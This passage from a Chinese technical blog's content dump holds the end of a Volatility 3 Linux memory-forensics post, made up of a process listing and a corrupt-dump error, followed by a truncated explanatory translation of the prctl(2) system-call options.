Disabled0x8fbe402d1980 4 4 2 rcu_par_gp Disabled0x8fbe402d6600 5 5 2 slub_flushwq Disabled0x8fbe4032b300 6 6 2 netns Disabled0x8fbe40329980 8 8 2 kworker&#x2F;0:0H Disabled0x8fbe4032cc80 10 10 2 mm_percpu_wq Disabled0x8fbe40333300 11 11 2 rcu_tasks_kthre Disabled0x8fbe40330000 12 12 2 rcu_tasks_rude_ Disabled0x8fbe40331980 13 13 2 rcu_tasks_trace Disabled0x8fbe40336600 14 14 2 ksoftirqd&#x2F;0 Disabled0x8fbe40334c80 15 15 2 rcu_preempt Disabled0x8fbe4033e600 16 16 2 migration&#x2F;0 Disabled0x8fbe4033cc80 17 17 2 idle_inject&#x2F;0 Disabled0x8fbe40b08000 19 19 2 cpuhp&#x2F;0 Disabled0x8fbe40b09980 20 20 2 cpuhp&#x2F;1 Disabled0x8fbe40b0e600 21 21 2 idle_inject&#x2F;1 Disabled0x8fbe40b0cc80 22 22 2 migration&#x2F;1 Disabled0x8fbe40b0b300 23 23 2 ksoftirqd&#x2F;1 Disabled0x8fbe40b14c80 25 25 2 kworker&#x2F;1:0H Disabled0x8fbe40b13300 26 26 2 cpuhp&#x2F;2 Disabled0x8fbe40b10000 27 27 2 idle_inject&#x2F;2 Disabled0x8fbe40b11980 28 28 2 migration&#x2F;2 Disabled0x8fbe40ba3300 29 29 2 ksoftirqd&#x2F;2 Disabled0x8fbe40ba1980 31 31 2 kworker&#x2F;2:0H Disabled0x8fbe40ba6600 32 32 2 cpuhp&#x2F;3 Disabled0x8fbe40ba4c80 33 33 2 idle_inject&#x2F;3 Disabled0x8fbe40ba8000 34 34 2 migration&#x2F;3 Disabled0x8fbe40ba9980 35 35 2 ksoftirqd&#x2F;3 Disabled0x8fbe40bae600 36 36 2 kworker&#x2F;3:0 Disabled0x8fbe40bacc80 37 37 2 kworker&#x2F;3:0H Disabled0x8fbe40bab300 38 38 2 cpuhp&#x2F;4 Disabled0x8fbe40bb3300 39 39 2 idle_inject&#x2F;4 Disabled0x8fbe40bb0000 40 40 2 migration&#x2F;4 Disabled0x8fbe40bb1980 41 41 2 ksoftirqd&#x2F;4 Disabled0x8fbe40bb4c80 43 43 2 kworker&#x2F;4:0H Disabled0x8fbe40bccc80 44 44 2 cpuhp&#x2F;5 Disabled0x8fbe40bcb300 45 45 2 idle_inject&#x2F;5 Disabled0x8fbe40bc8000 46 46 2 migration&#x2F;5 Disabled0x8fbe40bc9980 47 47 2 ksoftirqd&#x2F;5 Disabled0x8fbe40c51980 49 49 2 kworker&#x2F;5:0H Disabled0x8fbe40c56600 50 50 2 cpuhp&#x2F;6 Disabled0x8fbe40c54c80 51 51 2 idle_inject&#x2F;6 Disabled0x8fbe40c53300 52 52 2 migration&#x2F;6 Disabled0x8fbe40c50000 53 53 2 ksoftirqd&#x2F;6 Disabled0x8fbe40c58000 55 55 2 kworker&#x2F;6:0H Disabled0x8fbe40c59980 56 56 2 cpuhp&#x2F;7 Disabled0x8fbe40c5e600 57 57 2 idle_inject&#x2F;7 Disabled0x8fbe40c5cc80 58 58 2 migration&#x2F;7 Disabled0x8fbe40c6b300 59 59 2 ksoftirqd&#x2F;7 Disabled0x8fbe40c69980 61 61 2 kworker&#x2F;7:0H Disabled0x8fbe40c6e600 62 62 2 cpuhp&#x2F;8 Disabled0x8fbe40c6cc80 63 63 2 idle_inject&#x2F;8 Disabled0x8fbe40c70000 64 64 2 migration&#x2F;8 Disabled0x8fbe40c71980 65 65 2 ksoftirqd&#x2F;8 Disabled0x8fbe40c74c80 67 67 2 kworker&#x2F;8:0H Disabled0x8fbe40c73300 68 68 2 cpuhp&#x2F;9 Disabled0x8fbe40c7cc80 69 69 2 idle_inject&#x2F;9 Disabled0x8fbe40c7b300 70 70 2 migration&#x2F;9 Disabled0x8fbe40c78000 71 71 2 ksoftirqd&#x2F;9 Disabled0x8fbe40d09980 74 74 2 cpuhp&#x2F;10 Disabled0x8fbe40d0e600 75 75 2 idle_inject&#x2F;10 Disabled0x8fbe40d0cc80 76 76 2 migration&#x2F;10 Disabled0x8fbe40d0b300 77 77 2 ksoftirqd&#x2F;10 Disabled0x8fbe40d08000 78 78 2 kworker&#x2F;10:0 Disabled0x8fbe40d16600 79 79 2 kworker&#x2F;10:0H Disabled0x8fbe40d14c80 80 80 2 cpuhp&#x2F;11 Disabled0x8fbe40d13300 81 81 2 idle_inject&#x2F;11 Disabled0x8fbe40d10000 82 82 2 migration&#x2F;11 Disabled0x8fbe40d11980 83 83 2 ksoftirqd&#x2F;11 Disabled0x8fbe40d1b300 85 85 2 kworker&#x2F;11:0H Disabled0x8fbe40d18000 86 86 2 cpuhp&#x2F;12 Disabled0x8fbe40d19980 87 87 2 idle_inject&#x2F;12 Disabled0x8fbe40d1e600 88 88 2 migration&#x2F;12 Disabled0x8fbe40d29980 89 89 2 ksoftirqd&#x2F;12 Disabled0x8fbe40d2cc80 91 91 2 kworker&#x2F;12:0H Disabled0x8fbe40d2b300 92 92 2 cpuhp&#x2F;13 Disabled0x8fbe40d28000 93 93 2 idle_inject&#x2F;13 Disabled0x8fbe40d33300 94 94 2 migration&#x2F;13 Disabled0x8fbe40d30000 95 95 2 ksoftirqd&#x2F;13 Disabled0x8fbe40d36600 97 97 2 kworker&#x2F;13:0H Disabled0x8fbe40d34c80 98 98 2 cpuhp&#x2F;14 Disabled0x8fbe40e06600 99 99 2 idle_inject&#x2F;14 Disabled0x8fbe40e04c80 100 100 2 migration&#x2F;14 Disabled0x8fbe40e03300 101 101 2 ksoftirqd&#x2F;14 Disabled0x8fbe40e00000 102 102 2 kworker&#x2F;14:0 Disabled0x8fbe40e01980 103 103 2 kworker&#x2F;14:0H Disabled0x8fbe40e16600 104 104 2 cpuhp&#x2F;15 Disabled0x8fbe40e14c80 105 105 2 idle_inject&#x2F;15 Disabled0x8fbe40e13300 106 106 2 migration&#x2F;15 Disabled0x8fbe40e10000 107 107 2 ksoftirqd&#x2F;15 Disabled0x8fbe40e1b300 109 109 2 kworker&#x2F;15:0H Disabled0x8fbe40e18000 110 110 2 kdevtmpfs Disabled0x8fbe40e19980 111 111 2 inet_frag_wq Disabled0x8fbe40e1e600 112 112 2 kauditd Disabled0x8fbe415d6600 114 114 2 khungtaskd Disabled0x8fbe40ef4c80 117 117 2 oom_reaper Disabled0x8fbe40ef3300 118 118 2 writeback Disabled0x8fbe40ef0000 119 119 2 kcompactd0 Disabled0x8fbe40ef1980 120 120 2 ksmd Disabled0x8fbe40f0b300 121 121 2 kworker&#x2F;11:1 Disabled0x8fbe40f09980 123 123 2 khugepaged Disabled0x8fbe40f0e600 124 124 2 kintegrityd Disabled0x8fbe40f0cc80 125 125 2 kblockd Disabled0x8fbe40f10000 126 126 2 blkcg_punt_bio Disabled0x8fbe40f11980 127 127 2 tpm_dev_wq Disabled0x8fbe40f16600 128 128 2 ata_sff Disabled0x8fbe40f14c80 129 129 2 md Disabled0x8fbe40f13300 130 130 2 edac-poller Disabled0x8fbe40f19980 131 131 2 devfreq_wq Disabled0x8fbe40f1e600 132 132 2 watchdogd Disabled0x8fbe40f1b300 134 134 2 kworker&#x2F;6:1H Disabled0x8fbe40f18000 135 135 2 kswapd0 Disabled0x8fbe41b60000 136 136 2 ecryptfs-kthrea Disabled0x8fbe41b61980 137 137 2 kthrotld Disabled0x8fbe41b66600 138 138 2 irq&#x2F;24-pciehp Disabled0x8fbe41b64c80 139 139 2 irq&#x2F;25-pciehp Disabled0x8fbe41b63300 140 140 2 irq&#x2F;26-pciehp Disabled0x8fbe41b6b300 141 141 2 irq&#x2F;27-pciehp Disabled0x8fbe41b68000 142 142 2 irq&#x2F;28-pciehp Disabled0x8fbe41b69980 143 143 2 irq&#x2F;29-pciehp Disabled0x8fbe41b6e600 144 144 2 irq&#x2F;30-pciehp Disabled0x8fbe41b6cc80 145 145 2 irq&#x2F;31-pciehp Disabled0x8fbe44180000 146 146 2 irq&#x2F;32-pciehp Disabled0x8fbe44181980 147 147 2 irq&#x2F;33-pciehp Disabled0x8fbe44186600 148 148 2 irq&#x2F;34-pciehp Disabled0x8fbe44184c80 149 149 2 irq&#x2F;35-pciehp Disabled0x8fbe44183300 150 150 2 irq&#x2F;36-pciehp Disabled0x8fbe44191980 151 151 2 irq&#x2F;37-pciehp Disabled0x8fbe44196600 152 152 2 irq&#x2F;38-pciehp Disabled0x8fbe44194c80 153 153 2 irq&#x2F;39-pciehp Disabled0x8fbe44193300 154 154 2 irq&#x2F;40-pciehp Disabled0x8fbe44190000 155 155 2 irq&#x2F;41-pciehp Disabled0x8fbe44198000 156 156 2 irq&#x2F;42-pciehp Disabled0x8fbe44199980 157 157 2 irq&#x2F;43-pciehp Disabled0x8fbe4419e600 158 158 2 irq&#x2F;44-pciehp Disabled0x8fbe4419cc80 159 159 2 irq&#x2F;45-pciehp Disabled0x8fbe4419b300 160 160 2 irq&#x2F;46-pciehp Disabled0x8fbe441a0000 161 161 2 irq&#x2F;47-pciehp Disabled0x8fbe441a1980 162 162 2 irq&#x2F;48-pciehp Disabled0x8fbe441a6600 163 163 2 irq&#x2F;49-pciehp Disabled0x8fbe441a4c80 164 164 2 irq&#x2F;50-pciehp Disabled0x8fbe441a3300 165 165 2 irq&#x2F;51-pciehp Disabled0x8fbe441b4c80 166 166 2 irq&#x2F;52-pciehp Disabled0x8fbe441b3300 167 167 2 irq&#x2F;53-pciehp Disabled0x8fbe441b0000 168 168 2 irq&#x2F;54-pciehp Disabled0x8fbe441b1980 169 169 2 irq&#x2F;55-pciehp Disabled0x8fbe441b6600 170 170 2 kworker&#x2F;6:1 Disabled0x8fbe44994c80 172 172 2 kworker&#x2F;2:1 Disabled0x8fbe44990000 174 174 2 kworker&#x2F;5:1 Disabled0x8fbe44991980 175 175 2 kworker&#x2F;7:1 Disabled0x8fbe449a6600 179 179 2 kworker&#x2F;12:1 Disabled0x8fbe449b4c80 181 181 2 kworker&#x2F;14:1 Disabled0x8fbe449b3300 182 182 2 kworker&#x2F;15:1 Disabled0x8fbe449b0000 183 183 2 acpi_thermal_pm Disabled0x8fbe449b1980 184 184 2 scsi_eh_0 Disabled0x8fbe449b6600 185 185 2 scsi_tmf_0 Disabled0x8fbe4631e600 186 186 2 scsi_eh_1 Disabled0x8fbe4631cc80 187 187 2 scsi_tmf_1 Disabled0x8fbe46326600 191 191 2 mld Disabled0x8fbe46324c80 192 192 2 ipv6_addrconf Disabled0x8fbe46323300 194 194 2 kworker&#x2F;12:2 Disabled0x8fbe4633b300 200 200 2 kstrp Disabled0x8fbe46339980 202 202 2 zswap-shrink Disabled0x8fbe4633e600 203 203 2 kworker&#x2F;u257:0 Disabled0x8fbe46338000 207 207 2 charger_manager Disabled0x8fbe4633cc80 227 227 2 kworker&#x2F;3:1H Disabled0x8fbe561e6600 230 230 2 kworker&#x2F;4:1H Disabled0x8fbe561e4c80 231 231 2 kworker&#x2F;2:1H Disabled0x8fbe561e3300 242 242 2 kworker&#x2F;0:1H Disabled0x8fbe561e0000 256 256 2 kworker&#x2F;10:1H Disabled0x8fbe561e1980 257 257 2 kworker&#x2F;15:1H Disabled0x8fbe561f0000 258 258 2 kworker&#x2F;12:1H Disabled0x8fbe561f1980 259 259 2 kworker&#x2F;8:1H Disabled0x8fbe561f6600 260 260 2 kworker&#x2F;5:1H Disabled0x8fbe561f4c80 261 261 2 kworker&#x2F;13:1H Disabled0x8fbe561f3300 262 262 2 kworker&#x2F;9:1H Disabled0x8fbe5620b300 263 263 2 kworker&#x2F;1:1H Disabled0x8fbe56208000 264 264 2 kworker&#x2F;7:1H Disabled0x8fbe56209980 267 267 2 kworker&#x2F;14:1H Disabled0x8fbe5620e600 270 270 2 kworker&#x2F;11:1H Disabled0x8fbe5620cc80 299 299 2 scsi_eh_2 Disabled0x8fbe59aee600 300 300 2 scsi_tmf_2 Disabled0x8fbe59aecc80 301 301 2 scsi_eh_3 Disabled0x8fbe59aeb300 302 302 2 scsi_tmf_3 Disabled0x8fbe59ae8000 303 303 2 scsi_eh_4 Disabled0x8fbe59ae9980 307 307 2 scsi_tmf_4 Disabled0x8fbe59af4c80 308 308 2 scsi_eh_5 Disabled0x8fbe59af3300 309 309 2 scsi_tmf_5 Disabled0x8fbe59af0000 310 310 2 scsi_eh_6 Disabled0x8fbe59af1980 311 311 2 scsi_tmf_6 Disabled0x8fbe59af6600 312 312 2 scsi_eh_7 Disabled0x8fbe59b01980 313 313 2 scsi_tmf_7 Disabled0x8fbe59b06600 314 314 2 scsi_eh_8 Disabled0x8fbe59b04c80 315 315 2 scsi_tmf_8 Disabled0x8fbe59b03300 316 316 2 scsi_eh_9 Disabled0x8fbe59b00000 317 317 2 scsi_tmf_9 Disabled0x8fbe59b13300 318 318 2 scsi_eh_10 Disabled0x8fbe59b10000 319 319 2 scsi_tmf_10 Disabled0x8fbe59b11980 320 320 2 scsi_eh_11 Disabled0x8fbe59b16600 321 321 2 scsi_tmf_11 Disabled0x8fbe59b14c80 322 322 2 scsi_eh_12 Disabled0x8fbe59b1cc80 323 323 2 scsi_tmf_12 Disabled0x8fbe59b1b300 324 324 2 scsi_eh_13 Disabled0x8fbe59b18000 325 325 2 scsi_tmf_13 Disabled0x8fbe59b19980 326 326 2 scsi_eh_14 Disabled0x8fbe59b1e600 327 327 2 scsi_tmf_14 Disabled0x8fbe59c1b300 328 328 2 scsi_eh_15 Disabled0x8fbe59c18000 329 329 2 scsi_tmf_15 Disabled0x8fbe59c19980 330 330 2 scsi_eh_16 Disabled0x8fbe59c1e600 331 331 2 scsi_tmf_16 Disabled0x8fbe59c1cc80 332 332 2 scsi_eh_17 Disabled0x8fbe59c20000 333 333 2 scsi_tmf_17 Disabled0x8fbe59c21980 334 334 2 scsi_eh_18 Disabled0x8fbe59c26600 335 335 2 scsi_tmf_18 Disabled0x8fbe59c24c80 336 336 2 scsi_eh_19 Disabled0x8fbe59c23300 337 337 2 scsi_tmf_19 Disabled0x8fbe59c2b300 338 338 2 scsi_eh_20 Disabled0x8fbe59c28000 339 339 2 scsi_tmf_20 Disabled0x8fbe59c29980 340 340 2 scsi_eh_21 Disabled0x8fbe59c2e600 341 341 2 scsi_tmf_21 Disabled0x8fbe59c2cc80 342 342 2 scsi_eh_22 Disabled0x8fbe59c3cc80 343 343 2 scsi_tmf_22 Disabled0x8fbe59c3b300 344 344 2 scsi_eh_23 Disabled0x8fbe59c38000 345 345 2 scsi_tmf_23 Disabled0x8fbe59c39980 346 346 2 scsi_eh_24 Disabled0x8fbe59c3e600 347 347 2 scsi_tmf_24 Disabled0x8fbe59cfb300 348 348 2 scsi_eh_25 Disabled0x8fbe59cf8000 349 349 2 scsi_tmf_25 Disabled0x8fbe59cf9980 350 350 2 scsi_eh_26 Disabled0x8fbe59cfe600 351 351 2 scsi_tmf_26 Disabled0x8fbe59cfcc80 352 352 2 scsi_eh_27 Disabled0x8fbe59d00000 353 353 2 scsi_tmf_27 Disabled0x8fbe59d01980 354 354 2 scsi_eh_28 Disabled0x8fbe59d06600 355 355 2 scsi_tmf_28 Disabled0x8fbe59d04c80 356 356 2 scsi_eh_29 Disabled0x8fbe59d03300 357 357 2 scsi_tmf_29 Disabled0x8fbe59d10000 358 358 2 scsi_eh_30 Disabled0x8fbe59d11980 359 359 2 scsi_tmf_30 Disabled0x8fbe59d16600 360 360 2 scsi_eh_31 Disabled0x8fbe59d14c80 361 361 2 scsi_tmf_31 Disabled0x8fbe59e0e600 390 390 2 mpt_poll_0 Disabled0x8fbe59e0cc80 391 391 2 mpt&#x2F;0 Disabled0x8fbe59e0b300 394 394 2 scsi_eh_32 Disabled0x8fbe59e08000 395 395 2 scsi_tmf_32 Disabled0x8fbe57ae6600 435 435 2 kworker&#x2F;10:2 Disabled0x8fbe57ae0000 438 438 2 jbd2&#x2F;sda3-8 Disabled0x8fbe57ae3300 439 439 2 ext4-rsv-conver Disabled0x8fbe57ae4c80 451 451 2 kworker&#x2F;1:2 Disabled0x8fbe415d3300 485 485 1 systemd-journal Disabled0x8fbe563c3300 507 507 2 kworker&#x2F;5:2 Disabled0x8fbe586be600 511 511 1 vmware-vmblock- Disabled0x8fbe563c4c80 519 519 2 kworker&#x2F;0:3 Disabled0x8fbe43828000 525 525 2 kworker&#x2F;13:2 Disabled0x8fbe43829980 532 532 2 irq&#x2F;16-vmwgfx Disabled0x8fbe59860000 546 546 1 systemd-udevd Disabled0x8fbe4382e600 547 547 2 kworker&#x2F;6:2 Disabled0x8fbe4382cc80 600 600 2 kworker&#x2F;9:2H Disabled0x8fbe444a9980 637 637 2 irq&#x2F;66-vmw_vmci Disabled0x8fbe444ae600 638 638 2 irq&#x2F;67-vmw_vmci Disabled0x8fbe444b0000 801 801 2 cryptd Disabled0x8fbe444b3300 803 803 2 kworker&#x2F;9:2 Disabled0x8fbe444b4c80 818 818 2 kworker&#x2F;2:2 Disabled0x8fbe444b1980 849 849 2 nfit Disabled0x8fbe4382b300 851 851 2 kworker&#x2F;3:2 Disabled0x8fbe45d7cc80 857 857 1 systemd-oomd Disabled0x8fbe45d78000 858 858 1 systemd-resolve Disabled0x8fbe45d7e600 859 859 1 systemd-timesyn Disabled0x8fbe563c0000 861 861 1 VGAuthService Disabled0x8fbe441b8000 863 863 1 vmtoolsd Disabled0x8fbe47263300 905 905 1 accounts-daemon Disabled0x8fbe444a8000 906 906 2 kworker&#x2F;15:2 Disabled0x8fbe47260000 907 907 1 acpid Disabled0x8fbe5f89cc80 910 910 1 avahi-daemon Disabled0x8fbe5f898000 911 911 1 cron Disabled0x8fbe5f899980 912 912 1 dbus-daemon Disabled0x8fbe5f89e600 913 913 1 NetworkManager Disabled0x8fbe47248000 920 920 1 irqbalance Disabled0x8fbe47249980 921 921 1 networkd-dispat Disabled0x8fbe4724e600 922 922 1 polkitd Disabled0x8fbe4724cc80 923 923 1 power-profiles- Disabled0x8fbe594e8000 924 924 1 rsyslogd Disabled0x8fbe594eb300 940 940 1 snapd Disabled0x8fbe594ee600 941 941 1 switcheroo-cont Disabled0x8fbe594e9980 942 942 1 systemd-logind Disabled0x8fbe444acc80 943 943 1 udisksd Disabled0x8fbe45d7b300 944 944 1 wpa_supplicant Disabled0x8fbe4f508000 951 951 910 avahi-daemon Disabled0x8fbe5293cc80 1007 1007 1 ModemManager Disabled0x8fbe5293b300 1019 1019 1 cupsd Disabled0x8fbe594ecc80 1020 1020 1 frpc Disabled0x8fbe444ab300 1026 1026 1 unattended-upgr Disabled0x8fbe5292e600 1027 1027 1 containerd Disabled0x8fbe55e94c80 1081 1081 1 sshd Disabled0x8fbe55e96600 1112 1112 1 gdm3 Disabled0x8fbe46320000 1134 1134 1112 gdm-session-wor Disabled0x8fbe55e93300 1155 1155 1 cups-browsed Disabled0x8fbe59d23300 1177 1177 1 kerneloops Disabled0x8fbe48988000 1179 1179 1 kerneloops Disabled0x8fbe563ae600 1258 1258 1 systemd Disabled0x8fbe56163300 1264 1264 1258 (sd-pam) Disabled0x8fbe59701980 1343 1343 1258 pipewire Disabled0x8fbe587e8000 1344 1344 1258 pipewire-media- Disabled0x8fbe4977cc80 1346 1346 1258 pulseaudio Disabled0x8fbe5164cc80 1433 1433 1 gnome-keyring-d Disabled0x8fbe53019980 1438 1438 1134 gdm-wayland-ses Disabled0x8fbe53096600 1440 1440 1258 dbus-daemon Disabled0x8fbe5f88b300 1441 1441 1 rtkit-daemon Disabled0x8fbe516e0000 1480 1480 1438 gnome-session-b Disabled0x8fbe5b2c3300 1489 1489 1 dockerd Disabled0x8fbe5293e600 1552 1552 2 kworker&#x2F;4:3 Disabled0x8fbe5f020000 1572 1572 1258 xdg-document-po Disabled0x8fbe5f023300 1592 1592 1258 xdg-permission- Disabled0x8fbe522e3300 1606 1606 1572 fusermount3 Disabled0x8fbe515ae600 1628 1628 2 kworker&#x2F;7:2 Disabled0x8fbe5f01e600 1759 1759 1258 gvfsd Disabled0x8fbe5e111980 1767 1767 1258 gvfsd-fuse Disabled0x8fbe53018000 1957 1957 1258 gnome-session-c Disabled0x8fbe515a8000 2096 2096 1258 gnome-session-b Disabled0x8fbe5d898000 2118 2118 2 bpfilter_umh Disabled0x8fbe46321980 2124 2124 2096 at-spi-bus-laun Disabled0x8fbe4def3300 2132 2132 1258 gnome-shell Disabled0x8fbe5d880000 2152 2152 2124 dbus-daemon Disabled0x8fbe4724b300 2735 2735 1258 snapd-desktop-i Disabled0x8fbe45476600 2810 2810 2735 snapd-desktop-i Disabled0x8fbe5ca3cc80 2814 2814 1258 xdg-desktop-por Disabled0x8fbe5ca3b300 2818 2818 1258 xdg-desktop-por Disabled0x8fbe56108000 2826 2826 1258 gnome-shell-cal Disabled0x8fbe4408cc80 2829 2829 1 upowerd Disabled0x8fbe5ca38000 2832 2832 1258 dconf-service Disabled0x8fbe53090000 2838 2838 1258 gvfs-udisks2-vo Disabled0x8fbe53093300 2844 2844 1258 evolution-sourc Disabled0x8fbe52fb9980 2852 2852 1258 gvfs-mtp-volume Disabled0x8fbe5cf9cc80 2856 2856 1258 gvfs-afc-volume Disabled0x8fbe5cf9b300 2864 2864 1258 gvfs-goa-volume Disabled0x8fbe5dbd6600 2868 2868 1258 goa-daemon Disabled0x8fbe5cf98000 2872 2872 1258 evolution-calen Disabled0x8fbe5f526600 2889 2889 1258 goa-identity-se Disabled0x8fbe5cf99980 2890 2890 1258 evolution-addre Disabled0x8fbe5cf9e600 2895 2895 1258 gvfs-gphoto2-vo Disabled0x8fbe5d601980 2908 2908 1 packagekitd Disabled0x8fbe5dbd8000 2915 2915 1759 gvfsd-trash Disabled0x8fbe49761980 2930 2930 1258 gjs Disabled0x8fbe563a8000 2931 2931 1258 at-spi2-registr Disabled0x8fbe837a6600 0 0 0 Disabled Volatility was unable to read a requested page:Page error 0xcc in layer layer_name (Page Fault at entry 0x0 in table page directory pointer) * Memory smear during acquisition (try re-acquiring if possible) * An intentionally invalid page lookup (operating system protection) * A bug in the plugin/volatility3 (re-run with -vvv and file a bug) No further results will be produced 内存转储损坏 参考资料使用开源工具进行 Linux 内存取证-linux内存泄露工具 (51cto.com) Volatility3 crashes on Kali - Super User — Volatility3 在 Kali 上崩溃 Linux Tutorial — Volatility 3 2.5.2 documentation — Linux 教程 — Volatility 3 2.5.2 文档","categories":[{"name":"Linux内核","slug":"Linux内核","permalink":"http://example.com/categories/Linux%E5%86%85%E6%A0%B8/"}],"tags":[]},{"title":"学习 Linux 系统调用 prctl详解","slug":"学习-Linux-系统调用-prctl详解","date":"2023-12-21T07:09:07.000Z","updated":"2023-12-22T01:19:47.060Z","comments":true,"path":"2023/12/21/学习-Linux-系统调用-prctl详解/","link":"","permalink":"http://example.com/2023/12/21/%E5%AD%A6%E4%B9%A0-Linux-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8-prctl%E8%AF%A6%E8%A7%A3/","excerpt":"prctl(2) - Linux manual page (man7.org) sys.c - kernel&#x2F;sys.c - Linux source code (v6.6.7) - Bootlin prctl具体用法","text":"prctl(2) - Linux manual page (man7.org) sys.c - kernel&#x2F;sys.c - Linux source code (v6.6.7) - Bootlin prctl具体用法prctl是一个系统调用，用于控制和修改进程的行为的各个方面。 以下是prctl函数的基本原型： 123#include &lt;sys/prctl.h&gt;int prctl(int option, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5); 调用prctl时，第一个参数option描述了要执行的操作 PR_CAP_AMBIENT 根据arg2的值读取或更改调用线程的ambient capability set，该值必须是以下之一： PR_CAP_AMBIENT_RAISE PR_CAP_AMBIENT_RAISE将arg3中指定的功能添加到ambient set中。指定的能力必须已经存在于进程的permitted set中和inheritable set中。如果设置了SECBIT_NO_CAP_AMBIENT_RAISE 安全位，则不允许执行此操作。 PR_CAP_AMBIENT_LOWER PR_CAP_AMBIENT_LOWER从ambient set中删除arg3中指定的功能。 PR_CAP_AMBIENT_IS_SET PR_CAP_AMBIENT_IS_SET如果 arg3 中的功能位于ambient set中，则 prctl() 调用返回 1，否则返回 0。 PR_CAP_AMBIENT_CLEAR_ALL PR_CAP_AMBIENT_CLEAR_ALL所有功能都将从ambient set中删除。此操作需要将 arg3 设置为零。 在上述所有操作中，arg4和arg5必须指定为0。 PR_CAPBSET_READ 如果 arg2 中指定的功能位于调用线程的capability bounding set中，则返回（作为函数结果）1；如果不在，则返回 0。capability bounding set指示进程是否可以在后续调用 execve(2) 时通过文件允许的能力集接收能力。如果 arg2 中指定的功能无效，则调用将失败并显示错误 EINVAL。 PR_CAPBSET_DROP 如果调用线程在其user namespace中具有 CAP_SETPCAP 功能，则从调用线程的capability bounding set中删除 arg2 指定的功能。调用线程的任何子线程都将继承新减少的bounding set。 如果调用线程没有 CAP_SETPCAP，则调用失败并显示错误：EPERM；如果 arg2 不代表有效功能，则为 EINVAL；如果内核中未启用file capabilities，则为 EINVAL，在这种情况下不支持capability bounding set。 PR_SET_CHILD_SUBREAPER 如果 arg2 非零，则设置调用进程的“child subreaper”属性；如果 arg2 为零，则取消设置该属性。 child subreaper为其后代进程履行 init(1) 的角色。当一个进程成为孤立进程（即，其直接父进程终止）时，该进程将被重新指定为最近的仍然存在的ancestor subreaper。随后，在孤立进程中调用 getppid(2) 现在将返回 subreaper 进程的 PID，并且当孤儿进程终止时，subreaper 进程将收到 SIGCHLD 信号，并且能够在该进程上 wait(2)进程发现其终止状态。 fork(2) 和clone(2) 创建的子级不会继承“child subreaper”属性的设置。该设置在 execve(2) 中保留。 建立child subreaper进程在会话管理框架中很有用，其中进程的分层组由child subreaper进程管理，当其中一个进程（例如，双分叉守护进程）终止时，需要通知child subreaper进程（也许以便它可以重新启动）那个过程）。出于类似的原因，某些 init(1) 框架（例如 systemd(1)）采用 subreaper 进程。 PR_GET_CHILD_SUBREAPER 返回调用者的“child subreaper”设置，位于 (int *) arg2 指向的位置。 PR_SET_DUMPABLE 设置“可转储”属性的状态，该属性确定在传递默认行为是生成核心转储的信号时是否为调用进程生成核心转储。 在 Linux 2.6.12 及之前，arg2 必须为 0（SUID_DUMP_DISABLE，进程不可转储）或 1（SUID_DUMP_USER，进程可转储）。 在 Linux 2.6.13 和 Linux 2.6.17 之间，值 2 也是允许的，这会导致通常不会转储的任何二进制文件转储为只能由 root 读取；出于安全原因，此功能已被删除。 通常，“dumpable”属性设置为 1。但是，在以下情况下，它会重置为文件 &#x2F;proc&#x2F;sys&#x2F;fs&#x2F;suid_dumpable 中包含的当前值（默认值为 0）： • 进程的有效用户或组ID 已更改。 • 进程的文件系统用户或组ID 已更改（请参阅credentials(7) - Linux manual page (man7.org)）。 • 进程执行（execve(2)）set-user-ID 或set-group-ID 程序，导致有效用户ID 或有效组ID 的更改。 • 进程执行(execve(2)) 具有文件功能的程序（请参阅capabilities(7) - Linux manual page (man7.org)），但前提是所获得的允许的功能超过了该进程已允许的功能。 不可转储的进程无法通过 ptrace(2) PTRACE_ATTACH 附加；有关更多详细信息，请参阅ptrace(2) - Linux manual page (man7.org)。 如果进程不可转储，则进程的 &#x2F;proc&#x2F;pid 目录中文件的所有权将受到影响，如proc(5) - Linux manual page (man7.org)中所述。 PR_GET_DUMPABLE 返回（作为函数结果）调用进程的可转储属性的当前状态。 PR_SET_ENDIAN （自 Linux 2.6.18 起，仅限 PowerPC）将调用进程的字节序设置为 arg2 中给定的值，该值应为以下值之一：PR_ENDIAN_BIG、PR_ENDIAN_LITTLE 或 PR_ENDIAN_PPC_LITTLE（PowerPC 伪小字节序）。 PR_GET_ENDIAN （自 Linux 2.6.18 起，仅限 PowerPC）返回调用进程的字节序，位于 (int *) arg2 指向的位置。 PR_SET_FP_MODE （自 Linux 4.0 起，仅在 MIPS 上） 在 MIPS 架构上，可以使用 ABI 构建用户空间代码，该 ABI 允许与具有更严格的浮点 (FP) 要求的代码链接。 PR_GET_FP_MODE (自 Linux 4.0 起，仅在 MIPS 上) 返回（作为函数结果）当前浮点模式,成功时，调用返回一个表示当前浮点模式的位掩码。 PR_SET_FPEMU （自 Linux 2.4.18、2.5.9 起，仅在 ia64 上）将浮点仿真控制位设置为 arg2。传递 PR_FPEMU_NOPRINT 以静默模拟浮点操作访问，或传递 PR_FPEMU_SIGFPE 以不模拟浮点操作并发送 SIGFPE。 PR_GET_FPEMU （自 Linux 2.4.18、2.5.9 起，仅在 ia64 上）返回浮点仿真控制位，位于 (int *) arg2 指向的位置。 PR_SET_FPEXC 自 Linux 2.4.21、2.5.32 起，仅在 PowerPC 上）将浮点异常模式设置为 arg2。通过 PR_FP_EXC_SW_ENABLE 使用 FPEXC 进行 FP 异常使能，PR_FP_EXC_DIV 进行浮点除以零，PR_FP_EXC_OVF 进行浮点溢出，PR_FP_EXC_UND 进行浮点下溢，PR_FP_EXC_RES 进行浮点不精确结果，PR_FP_EXC_INV 进行浮点无效操作，PR_FP_EXC_DISABLED对于禁用 FP 异常，PR_FP_EXC_NONRECOV 表示异步不可恢复异常模式，PR_FP_EXC_ASYNC 表示异步可恢复异常模式，PR_FP_EXC_PRECISE 表示精确异常模式。 PR_GET_FPEXC （自 Linux 2.4.21、2.5.32 起，仅在 PowerPC 上）返回浮点异常模式，位于 (int *) arg2 指向的位置。 PR_SET_IO_FLUSHER (自 Linux 5.6 起) 如果用户进程涉及block层或文件系统 I&#x2F;O 路径，并且可以在处理 I&#x2F;O 请求时分配内存，则必须将 arg2 设置为 1。这将使进程处于 IO_FLUSHER 状态，这使得它可以在分配内存时进行特殊处理以取得进展。如果arg2为0，进程将清除IO_FLUSHER状态，并使用默认行为。 调用进程必须具有 CAP_SYS_RESOURCE 能力。,arg3、arg4 和 arg5 必须为零。 IO_FLUSHER 状态由通过 fork(2) 创建的子进程继承，并在 execve(2) 中保留。 IO_FLUSHER 应用程序的示例包括 FUSE 守护程序、SCSI 